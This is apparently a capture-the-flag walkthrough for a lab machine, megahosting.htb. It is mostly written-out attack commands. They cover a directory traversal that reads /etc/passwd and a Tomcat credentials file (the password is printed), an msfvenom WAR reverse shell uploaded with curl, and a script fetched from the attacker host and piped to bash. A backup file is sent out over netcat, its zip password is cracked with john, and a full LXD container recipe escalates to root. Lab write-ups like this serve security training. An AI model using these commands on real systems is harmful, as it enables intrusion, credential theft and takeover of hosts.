Visiting the site 10.10.10.194/megahosting.htb, this has moved to a new site.

Testing directory traversal, http://megahosting.htb/news.php?file=../../../../etc/passwd
We can see the list of users and we need a way of getting shell as a low privileged user
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin OR tomcat:x:997:997::/opt/tomcat:/bin/false OR ash:x:1000:1000:clive:/home/ash:/bin/bash
We are not able to read the private key from root or ash home directory.
We proceed to port 8080 to explore some more. The following lines are interesting "Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9"
We also try to read users from "Users are defined in /etc/tomcat9/tomcat-users.xml." but no success. We search around where to find the tomcat config file on
Apache httpd 2.4.41 and here at "view-source:http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml", we are able to read the
default creds

 <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
   
   We login to the web UI "http://10.10.10.194:8080/manager/html" using tomcat:$3cureP4s5w0rd123! and proceed to upload a war reverse shell payload.
   
  The syntax as "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f war > shell.war" and then upload it through curl as :
  "curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell"
  We then start a reverse netcat listener on port 4444 and call the page we uploaded the page as "curl http://10.10.10.194:8080/shell/"
  Shell opened as tomcat user. We proceed to get a more stable shell by "python3 -c 'import pty; pty.spawn("/bin/bash")'"
  We run the python simple server on attacking machine python3 -m http.server and run the linpeas shell on victim machine as "curl http://10.10.14.13:8000/linpeas.sh | bash"
  Here, we discover some backup file on /var/www/html/files/ it is dated and appears as below 16162020_backup.zip.
  Now, we use netcat to download file to our machine: 
  1. On sending machine  "nc -w 3 10.10.14.13 1234 < 16162020_backup.zip"
  2. On receiving machine  "nc -l -p 1234  > 16162020_backup.zip"
  
  To unzip the file we need a password. We send this zip to John and crack it as below:
  1. zip2john 16162020_backup.zip > hash
  2. john hash --wordlist=/usr/share/wordlists/rockyou.txt
  Cracked password : admin@it
  
  Trying to su in as ash user with the password is successful. 
  User flag pawned at /home/ash user directory!
  
  ================================
  Privilege escalation
  
  Path : Privilege escalation via LXD : https://github.com/initstring/lxd_root
  We will try the version two exploit first.
  The syntax is as python3 lxd_rootv2.py <container name> meaning we need to create a container or get a list of existing containers.
  Listing the container names is challenging so we decide to try out the method at https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
  
  #### Steps
  
  #Install requirements
sudo apt update
sudo apt-get install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml

# If that fails, run it adding -o image.release=3.8 at the end.

Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs
Add the image:

lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

Create a container and add root path
lxc init
lxc init alpine privesc -c security.privileged=true
lxc list #List containers
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

Execute the container:

lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted

Root user pawned!!
/mnt/root/root # cat root.txt
